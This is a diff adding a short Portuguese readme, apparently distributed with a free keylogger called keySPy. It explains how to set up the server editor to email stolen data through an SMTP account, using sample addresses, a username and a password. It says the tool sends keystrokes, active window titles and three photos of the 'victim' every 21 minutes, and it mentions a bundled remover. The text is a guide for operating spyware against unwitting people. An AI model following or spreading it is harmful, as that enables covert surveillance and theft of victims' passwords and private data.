@@ -1,0 +1,34 @@
+essa e uma versao free e exemplo como usar onde ta o Editor_client_keySPy e o editor do server
+
+
+e o sever e o server---
+ 
+Vacina_keylogger_remover ao caso de querer testar essa e a vacina dele
+
+bom como usar
+eu nao testei com todos servidor smtp 
+testei com o yahoo e funciono
+fais o seguinte
+
+exemplo..
+
+kpdo@yahoo.com.br   <no email que vai enviar
+
+
+Kpdo@yahoo.com.br  < no email que vai receber
+
+
+kpdo              < no usuario
+12433kpdo         < na senha
+
+
+smtp.mail.yahoo.com.br  < no smtp server
+
+bom e isso
+os logs chega de 21 em 21 minutos 
+chega 3 foto da vitima e um log em .txt 
+captura o titulo da janela ativa e captura as tecla
+de Maiuscula pa miniscula bom e isso.
+se os logs nao chegar vai na caixa spawm ou lixo eletronico e desativa o spaw guard.
+
+Email:sim_kaopa@hotmail.com
